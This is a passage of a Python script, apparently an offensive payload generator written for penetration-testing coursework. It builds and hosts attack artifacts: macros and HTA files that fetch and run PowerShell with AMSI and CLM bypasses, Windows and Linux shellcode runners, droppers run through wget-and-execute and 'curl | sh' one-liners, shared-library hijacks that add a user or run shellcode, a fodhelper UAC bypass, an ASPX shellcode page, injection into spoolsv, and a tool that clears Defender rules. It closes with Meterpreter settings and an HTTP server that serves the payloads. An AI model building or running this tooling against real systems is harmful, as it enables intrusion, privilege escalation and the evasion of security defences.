code = to_ps_iwr(http_server_url, MyPayloadFile.bypass_clm_amsi_shell)
template_replace('macro.vb',
             out_file,
             {'code': code})
print(f'\tFile: {out_file}\n')

print('[*] Macro Load remote ps1: Bypass CLM with Installutil: Download EXE -> InstallUtil -> CLM Bypass -> Payload')
out_file = obfuscate_name('macro_bypass_clm_with_installutil_rev.vb')
code = to_ps_iwr(http_server_url, MyPayloadFile.bypass_clm_amsi_shell)[::-1]
template_replace('macro_rev.vb',
                  out_file,
                  {'code': code})
print(f'\tFile: {out_file}\n')

### HTA
print('[*] HTA Load amsi_bypass.ps1 -> shellcode_runner.ps1')
exec_hta = obfuscate_name('exec.hta')
template_replace('exec.hta',
             exec_hta,
             {'cmd': to_ps_iwr(http_server_url, [MyPayloadFile.amsi_shell])})
print('\tFile: %s' % exec_hta)
print(f'\tC:\Windows\system32\mshta.exe {http_server_url}/{exec_hta}\n')

### HTA Bypass CLM
print('[*] HTA amsi & clm bypass & shellcode_runner.ps1')
exec_hta = obfuscate_name('clm_ps.hta')
template_replace('exec.hta',
             exec_hta,
             {'cmd': to_ps_iwr(http_server_url, [MyPayloadFile.bypass_clm_amsi_shell])})
print('\tFile: %s' % exec_hta)
print(f'\tC:\Windows\system32\mshta.exe {http_server_url}/{exec_hta}\n')

### HTA Bypass CLM
print('[*] HTA amsi & clm bypass & shellcode_runner.ps1')
exec_hta = obfuscate_name('clm_cert.hta')
template_replace('clm_cert.hta',
             exec_hta,
             {'url': f'{http_server_url}/{installutil_dropper_exe}', 'filename': installutil_dropper_exe})
print('\tFile: %s' % exec_hta)
print(f'\tC:\Windows\system32\mshta.exe {http_server_url}/{exec_hta}\n')

# JS AMSI & CLM Bypass & shellcode runner
print('[*] JS load amsi & clm bypass ps1')
out_file = 'clm.js'
template_replace('load.js', out_file, {'payload': to_ps_iwr(http_server_url, MyPayloadFile.bypass_clm_amsi_shell, base64encoded=True)})
print(f'\tFile: {out_file}\n')

# DLL shellcode_runner for DotNetToJScript
print('[*] DLL DotNetToJScript DLL -> Run AES(shellcode)')
cs_file = 'DotNetToJScript_shellcode_runner_aes.cs'
out_file = 'DotNetToJScript_shellcode_runner_aes.dll'
template_replace(cs_file, cs_file, {'b64_aes_shellcode': b64_aes_shellcode, 'aes_key': aes_key, 'aes_iv': aes_iv})
compile_cs_in_out_folder(cs_file, out_file, to_dll=True)
print(f'\tFile: %s' % out_file)
command = windows_download_command(http_ip, http_port, out_file)
print(f'\t{command}\n\tDotNetToJScript.exe -v v4 -o test.js; wscript.exe .\test.js {out_file}\n')

# ----------------------------------------------------
print_title("Linux")

print('[*] Linux C shellcode runner')
c_shellcode_buf = to_buf(raw_shellcode_linux)[BufFormat.C]
c_file = obfuscate_name('shellcode_runner.c')
template_replace('shellcode_runner.c', c_file, {'shellcode': c_shellcode_buf})
out_file = obfuscate_name('shell.elf')
cmd = 'gcc  -fno-stack-protector -z execstack -static -o %s %s' % (os.path.join(out_folder, out_file), os.path.join(out_folder, c_file))
execute_command(cmd)
execute_command('chmod +x %s' % os.path.join(out_folder, out_file))
random_out_name = random_str(6)
print(f'\twget {http_server_url}/{random_out_name} -O /tmp/{random_out_name} && chmod 777 /tmp/{random_out_name} && /tmp/{random_out_name}\n')


print('[*] Linux C shellcode runner with xor')
c_shellcode_buf = to_buf(MyEncoder.xor(raw_shellcode_linux, 'J'))[BufFormat.C]
c_file = obfuscate_name('shellcode_runner_xor.c')
template_replace('shellcode_runner_xor.c', c_file, {'shellcode': c_shellcode_buf})
shell_xor_elf = obfuscate_name('shellxor.elf')
cmd = 'gcc -fno-stack-protector -z execstack -static -o %s %s' % (os.path.join(out_folder, shell_xor_elf), os.path.join(out_folder, c_file))
execute_command(cmd)
execute_command('chmod +x %s' % os.path.join(out_folder, shell_xor_elf))
wget_and_execute_shellxor = f'wget {http_server_url}/{shell_xor_elf} -O /tmp/{random_out_name} && chmod 777 /tmp/{random_out_name} && /tmp/{random_out_name}'
print(f'\t%s\n' % wget_and_execute_shellxor)
write_md('shellxor.elf', wget_and_execute_shellxor)

print('[*] Linux dropper.elf')
c_file = obfuscate_name('dropper.c')
template_replace('dropper.c', c_file, {'cmd': wget_and_execute_shellxor})
out_file = obfuscate_name('dropper.elf')
cmd = 'gcc -fno-stack-protector -static -z execstack -o %s %s' % (os.path.join(out_folder, out_file), os.path.join(out_folder, c_file))
execute_command(cmd)
random_out_name = random_str(6)
command = f'wget {http_server_url}/{out_file} -O /tmp/{random_out_name} && chmod 777 /tmp/{random_out_name} && /tmp/{random_out_name}'
print('\t%s\n' % command)
write_md('dropper.elf', command)

print('[*] Linux dropper.sh')
out_file = 'dropper.sh'
command = f'wget {http_server_url}/{shell_xor_elf} -O /tmp/{random_out_name} && chmod +x /tmp/{random_out_name} && /tmp/{random_out_name}\n'
open(output_path(out_file), 'w').write(command)
command = f'curl -L {http_server_url}/{out_file} | sh'
print('\t%s\n' % command)
write_md('dropper.sh', command)

print('[*] Linux SO Shared library hijacking, hijacking top command libgpg-error.so.0 (add user mark / mark1234)')
template_replace('gpg.map', 'gpg.map')
c_file = 'shared_lib_hijacking_libgpg-error.c'
template_replace(c_file, c_file)
out_file = obfuscate_name('libgpg-error.so.0_adduser')
cmd = f'cd {out_folder} && gcc -shared -Wl,--version-script gpg.map -o {out_file} -fPIC {c_file}'
execute_command(cmd)
print('\tUsage:')
print(f'\twget {http_server_url}/{out_file} -O libgpg-error.so.0')
print('\techo export LD_LIBRARY_PATH=/home/offsec/ldlib/ >> ~/.bashrc && source ~/.bashrc\n')

print('[*] Linux SO Shared library hijacking, hijacking top command libgpg-error.so.0 (shellcode runner)')
template_replace('gpg.map', 'gpg.map')
c_file = 'shared_lib_hijacking_libgpg-error_shellcode_runner.c'
c_shellcode_buf = to_buf(MyEncoder.xor(raw_shellcode_linux, 'J'))[BufFormat.C]
template_replace(c_file, c_file, {'shellcode': c_shellcode_buf})
out_file = obfuscate_name('libgpg-error.so.0_shell')
cmd = f'cd {out_folder} && gcc -shared -Wl,--version-script gpg.map -o {out_file} -fPIC {c_file}'
execute_command(cmd)
print('\tUsage:')
print(f'\twget {http_server_url}/{out_file} -O libgpg-error.so.0')
print('\techo export LD_LIBRARY_PATH=/home/offsec/ldlib/ >> ~/.bashrc && source ~/.bashrc\n')


print('[*] Linux SO Shared library hijacking, Hooking geteuid() (shellcode runner)')
c_file = 'shared_lib_hooking_geteuid.c'
c_shellcode_buf = to_buf(raw_shellcode_linux)[BufFormat.C]
template_replace(c_file, c_file, {'shellcode': c_shellcode_buf})
#cmd = f'cd {out_folder} && gcc -Wall -fPIC -z execstack -c -o {c_file}.o {c_file}'
out_file = 'evil_geteuid.so'
#execute_command(cmd)
#cmd = f'cd {out_folder} && gcc -shared -o {out_file} {c_file}.o -ldl'
#execute_command(cmd)
cmd = 'gcc -shared -o %s -Wall -z execstack -fPIC %s' % (output_path(out_file), output_path(c_file))
execute_command(cmd)
print('\tUsage:')
print(f'\twget {http_server_url}/{out_file} -O {out_file}')
print('\techo alias sudo=\\"sudo LD_PRELOAD=/home/offsec/' + out_file +'\\" >> .bashrc && source ~/.bashrc\n')
# Error: cp: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34' not found (required by /home/offsec/evil_geteuid.so)
print('[*] Compile c on target:')
print(f'\twget {http_server_url}/{c_file} -O {c_file} && {cmd}\n')


# ----------------------------------------------------
print_title('Others')
# UAC Bypass
uac_command = '''\tREG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command
\tREG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ
\tREG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "{cmd}" /f
\tC:\windows\system32\\fodhelper.exe\n'''.format(cmd=to_ps_iwr(http_server_url, shellcode_entry_ps1_file))
print('[*] UAC Bypass Command:\n' + uac_command)

print('[*] ASPX: met.aspx shellcode runner with caesar shellcode')
out_file = 'met.aspx'
shellcode_caesar_add_5 =  to_buf(MyEncoder.caesar(shellcode_raw, CAESAR_NUM))['csharp']
template_replace('met.aspx', out_file, {'shellcode': shellcode_caesar_add_5})
command = windows_download_command(http_ip,http_port, out_file)
print('\t%s\n' % command)
write_md('met.aspx', command)

print('[*] EXE: inject.exe Inject caesar shellcode to spoolsv')
cs_file = 'inject.cs'
out_file = 'inject.exe'
shellcode_caesar_add_5 =  to_buf(MyEncoder.caesar(shellcode_raw, CAESAR_NUM))[BufFormat.CSHARP]
template_replace(cs_file, cs_file, {'shellcode': shellcode_caesar_add_5})
compile_cs_in_out_folder(cs_file, out_file=out_file)
print('\tFile: %s\n' % windows_download_command(http_ip, http_port, out_file))

print('[*] EXE: lat.exe Clean defender rules and modify service binary (SensorDataService)')
cs_file = 'lat.cs'
out_file = 'lat.exe'
template_replace(cs_file, cs_file)
compile_cs_in_out_folder(cs_file, out_file=out_file)
print('\tFile: %s\n' % windows_download_command(http_ip, http_port, out_file))


try:
    print("Meterpreter: %s, %s, %s" % (met_ip, met_port, arch))
    print("setg payload %s" % meterpreter_payload_windows)
    print("setg payload %s" % meterpreter_payload_linux)
    print('\n\n==========================')
    playground = out_folder
    # print(f'Serving HTTP on {http_ip} port {http_port} ({http_server_url}/) ...')
    print('press ^C to stop')
    web_dir = os.path.join(os.path.dirname(__file__), playground)

    print('Bind to to http://0.0.0.0:%s/' % (http_port))
    httpd = HTTPServer(web_dir, ('0.0.0.0', int(http_port)))
    httpd.serve_forever()

except KeyboardInterrupt:
    print('Control C')
